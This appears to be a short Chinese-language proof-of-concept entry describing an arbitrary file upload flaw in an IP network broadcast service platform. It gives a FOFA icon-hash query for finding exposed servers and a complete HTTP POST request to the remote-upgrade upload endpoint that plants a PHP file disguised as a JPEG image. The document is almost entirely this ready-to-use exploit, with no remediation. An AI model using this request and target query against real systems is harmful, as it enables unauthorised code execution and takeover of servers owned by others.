# IP网络广播服务平台upload存在任意文件上传漏洞

IP网络广播服务平台存在任意文件上传漏洞，攻击者可以上传恶意文件，导致服务器安全问题。

## fofa

```java
icon_hash="-568806419"
```

## poc

```java
POST /api/v2/remote-upgrade/upload HTTP/1.1
Host
Content-Length: 197
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://127.0.0.1
Content-Type: multipart/form-data; boundary=----WebKitFormBoundarytiZYyyKkbwCxtHC1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://127.0.0.1/api/v2/remote-upgrade/upload
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,ru;q=0.8,en;q=0.7
Connection: close

------WebKitFormBoundarytiZYyyKkbwCxtHC1
Content-Disposition: form-data; name="file"; filename="1.php"
Content-Type: image/jpeg

<?php phpinfo();?>
------WebKitFormBoundarytiZYyyKkbwCxtHC1--
```

